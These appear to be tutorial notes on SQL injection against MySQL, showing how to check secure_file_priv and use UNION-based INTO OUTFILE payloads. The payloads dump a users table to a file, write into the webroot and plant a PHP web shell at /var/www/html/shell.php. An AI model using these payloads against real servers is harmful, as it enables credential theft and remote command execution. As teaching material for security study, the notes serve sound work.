To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server
```python
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
```python
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
## SELECT INTO OUTFILE
Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the `SELECT .. INTO OUTFILE` statement.

```python
SELECT * from users INTO OUTFILE '/tmp/credentials';
#Writes the result of the query into the specified location
```

```python
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
#We can also write strings like this into the specified location.
```

#### Write files to the webroot
```python
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
# Inorder to determine the location of the webroot, we can use load_file to read the server configuration. Another way is to run a fuzzing scan and try to write files to different possible web roots using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).
```
###### Payload would be as follows
```python
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

## Writing a Web Shell
- Change the string from the above payload to a php web shell payload:
```python
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
